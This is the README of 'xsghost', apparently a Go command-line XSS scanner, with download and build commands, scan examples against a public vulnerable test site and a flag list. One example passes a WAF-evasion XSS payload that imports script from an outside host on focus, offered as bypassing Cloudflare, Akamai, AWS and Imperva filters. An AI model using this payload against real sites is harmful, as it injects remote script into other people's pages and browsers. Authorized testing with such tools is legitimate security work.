# xsghost
One XSS scan go based

# Download, Build and Install.
### WINDOWS Download
```
curl -L -o xsghost.exe "https://github.com/eikehacker1/xsghost/raw/refs/heads/main/xsghost.exe"
```
### Linux Download
```
curl -L -o  xsghost "https://github.com/eikehacker1/xsghost/raw/refs/heads/main/xsghost"
```
### Build on Any System using GO. 

```
go install -v github.com/eikehacker1/xsghost@latest
```

# How to Uuse 

###  Use without filter

```
./xsghost.exe testphp.vulnweb.com 
```

### Use with filter

```
./xsghost.exe testphp.vulnweb.com  -only-poc 
```

###  Bypass Payload in AWS, Iperva, Cloudflare and Akamai.

```
./xsghost.exe testphp.vulnweb.com  -only-poc -payload "<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>"
```
### Proxy bypass

```
./xsghost.exe testphp.vulnweb.com  -only-poc -proxy "http://proxy:8080" 
```

### -h func

```
 -a    Append the value instead of replacing it
  -c int
        Set concurrency (default 50)
  -dates
        show date of fetch in the first column
  -get-versions
        list URLs for crawled versions of input URL(s)
  -headers value
        Headers
  -ignore-path
        Ignore the path when considering what constitutes a duplicate
  -no-subs
        don't include subdomains of the target domain
  -only-poc
        Show only potentially vulnerable URLs
  -payload string
        XSS payload
  -proxy string
        Send traffic to a proxy (default "0")
```
